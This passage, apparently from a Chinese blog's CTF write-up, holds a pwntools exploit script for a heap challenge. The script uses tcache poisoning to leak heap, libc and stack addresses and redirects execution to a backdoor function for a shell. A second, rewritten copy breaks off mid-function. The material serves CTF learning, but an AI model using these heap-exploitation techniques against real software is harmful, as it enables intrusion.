<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'edit'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'size:'</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_edit <span class="token operator">=</span> <span class="token number">4</span>
edit_index_words <span class="token operator">=</span> <span class="token string">''</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'edit data:'</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'which one you choose?'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
misc <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ma'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>misc<span class="token punctuation">)</span>
result_bytes <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>misc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result_bytes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result_bytes<span class="token punctuation">)</span>
byt <span class="token operator">=</span> result_bytes<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token comment">#异或值</span>
heap <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>byt<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
heap_base <span class="token operator">=</span> heap<span class="token operator">&lt;&lt;</span><span class="token number">12</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>
<span class="token comment"># edit(content=p64(0)*2)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'edit'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'magic address: '</span><span class="token punctuation">)</span>
back <span class="token operator">=</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
backdoor <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>back<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'backdoor'</span><span class="token punctuation">,</span>backdoor<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">^</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'misc'</span><span class="token punctuation">,</span>heap<span class="token operator">^</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>

add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
<span class="token comment">#</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">b'\x05\x00'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>

<span class="token comment">#程序基地址</span>
start <span class="token operator">=</span> backdoor<span class="token operator">-</span><span class="token number">0x12be</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'backdoor'</span><span class="token punctuation">,</span>backdoor<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>
stdout_addr <span class="token operator">=</span> start<span class="token operator">+</span><span class="token number">0x4020</span>
<span class="token comment">#通过给出的backdoor地址计算出程序基地址，这样就可以找到got表</span>
<span class="token comment">#或者stdout这样的libc地址了，通过任意地址申请泄露libc了</span>
leak_info<span class="token punctuation">(</span><span class="token string">'stdout_addr'</span><span class="token punctuation">,</span>stdout_addr<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">^</span><span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
misc <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ma'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>misc<span class="token punctuation">)</span>
result_bytes <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>misc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result_bytes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result_bytes<span class="token punctuation">)</span>
byt <span class="token operator">=</span> result_bytes<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
stdo <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>byt<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> stdo <span class="token operator">-</span><span class="token number">0x21b780</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'environ'</span><span class="token punctuation">,</span>environ<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">^</span><span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
misc <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ma'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>misc<span class="token punctuation">)</span>
result_bytes <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>misc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result_bytes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result_bytes<span class="token punctuation">)</span>
byt <span class="token operator">=</span> result_bytes<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
envi <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>byt<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'environ'</span><span class="token punctuation">,</span>envi<span class="token punctuation">)</span>
rbp <span class="token operator">=</span> envi<span class="token operator">-</span><span class="token number">0x148</span>
<span class="token comment">#-----------------</span>
<span class="token comment">#检测限制，tcache不对齐</span>
<span class="token comment"># add(size=0x18)</span>
<span class="token comment"># delete()</span>
<span class="token comment"># payload = p64(heap^(rbp+0x8))</span>
<span class="token comment"># edit(content=payload)</span>
<span class="token comment"># add(size=0x18)</span>
<span class="token comment"># add(size=0x18)</span>
<span class="token comment"># edit(content=p64(backdoor))</span>
<span class="token comment"># pause()</span>
<span class="token comment">#-----------------</span>

<span class="token comment">#唯一指向当前chunk的指针buf</span>
buf <span class="token operator">=</span> start<span class="token operator">+</span><span class="token number">0x4040</span>
leak_info<span class="token punctuation">(</span><span class="token string">'buf'</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'rbp'</span><span class="token punctuation">,</span>rbp<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'backdoor'</span><span class="token punctuation">,</span>backdoor<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>heap<span class="token operator">^</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#抬栈！！栈对齐！！还记不住，sbsbsb</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>backdoor<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很有意思，也学到了一些东西，很不错的一道题，感觉讲的不是很清晰啊</p>
<p>重新做了一遍，重新写的wp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>param<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>param<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'edit'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_choice_words<span class="token operator">=</span><span class="token string">'choose?'</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'size:'</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_edit <span class="token operator">=</span> <span class="token number">4</span>
edit_index_words <span class="token operator">=</span> <span class="token string">''</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'data:'</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> choice<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_choice_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
